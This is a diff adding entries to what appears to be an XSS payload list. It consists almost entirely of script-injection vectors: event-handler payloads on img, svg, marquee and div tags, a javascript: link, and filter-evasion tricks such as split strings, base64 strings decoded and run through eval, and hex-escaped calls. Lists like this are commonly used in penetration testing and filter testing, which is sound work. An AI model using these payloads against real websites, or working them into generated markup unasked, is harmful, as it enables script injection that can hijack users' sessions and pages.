@@ -5,3 +5,25 @@
 <a href="javascript:alert(1) ">xss</a>
 <img src=x onerror='prompt(8)'>
 <script ~~~>alert(0%0)</script ~~~>
+
+
+<img src=x onerror=alert()>
+<img/src=x onerror=”alert()”>
+<svg onload=alert()>
+<svg/onload=’alert()’>
+<marquee 
+onstart=alert()>
+<div style=”width:1000px;height:1000px” onmouseover=alert()>asdfa</div>
+<a onmouseover=alert()>some random text
+
+confirm()
+prompt()
+window[‘alert’](‘xss’)
+window['ale'+'rt']('xss')
+eval(window.atob('YWxlcnQoJ3hzcycp'))
+//decode base64 string && execute
+eval(window['atob']('YWxlcnQoJ3hzcycp'))
+window['e'+'v'+'a'+'l'](window['atob']('YWxlcnQoJ3hzcycp'))
+
+onerror=alert; throw “xss”
+<script>alert\x28\x29</script>
